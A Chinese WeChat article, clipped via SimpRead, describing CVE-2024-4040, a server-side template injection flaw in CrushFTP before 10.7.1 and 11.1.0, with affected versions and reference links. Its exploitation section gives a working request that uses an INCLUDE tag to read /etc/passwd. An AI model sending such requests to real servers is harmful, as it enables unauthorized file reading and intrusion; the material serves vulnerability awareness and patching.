<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uvCW-oz4Ztzi94cauJQFOg)

_**本人非原创漏洞作者，文章仅作为知识分享用**_

_**一切直接或间接由于本文所造成的后果与本人无关**_

_**如有侵权，联系删除**_

_**产品简介**_  

CrushFTP 是一款支持 FTP, FTPS, SFTP, HTTP, HTTPS, WebDAV and WebDAV SSL 等协议的跨平台 FTP 服务器软件。它同时提供一个 WEB 接口让用户可以使用浏览器来管理他们的文件。

```
厂商官网：http://www.crushftp.com/

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfia2wG2qmD6IBPLficXv8KaN6Xvo3jJndm5HlvJKyEYicZANtYBZheQibnXib1mkLc7JibNqDBIyiblByic3w/640?wx_fmt=png&from=appmsg)

_**空间测绘**_  

```
回复“20240426”获取空检测绘语句

```

_**漏洞描述**_  

所有平台上 10.7.1 和 11.1.0 之前的所有版本中的 CrushFTP 中的服务器端模板注入漏洞允许未经身份验证的远程攻击者从 VFS 沙箱外部的文件系统读取文件、绕过身份验证以获得管理访问权限并执行远程代码在服务器上。

_**影响版本**_  

```
10.7.1 和 11.1.0 之前的所有版本

```

_**漏洞利用**_  

1. 访问 CrushFTP 网站，需要 cookie 中 “currentAuth” 的值。  

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfia2wG2qmD6IBPLficXv8KaN6WWlQrrJfectdo9T406r5cflrn5BXUKQR9v5nbaWwAjGffrwU0uDBag/640?wx_fmt=png&from=appmsg)

2. 成功读取到文件 “/etc/passwd”。  

```
/WebInterface/function/?command=zip&c2f=iJg8&path=<INCLUDE>/etc/passwd</INCLUDE>&names=*

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfia2wG2qmD6IBPLficXv8KaN66BX96Tryhj5Ypk9Jgy9tFJl5n2NXwo6hapHV4GExhPYraEfh0Fwn8w/640?wx_fmt=png&from=appmsg)

_**参考链接**_  

```
https://nvd.nist.gov/vuln/detail/CVE-2024-4040
https://github.com/rbih-boulanouar/CVE-2024-4040
https://github.com/Mufti22/CVE-2024-4040

```

**回复 “20240426” 获取空检测绘语句**

![](https://mmbiz.qpic.cn/mmbiz_gif/DT3jlATYvfia2wG2qmD6IBPLficXv8KaN6icRSuQuIACRgY5hUygFRh9ypc853kFibsiaAzaKSRB8CMaElnJsqnibicWw/640?wx_fmt=gif&from=appmsg)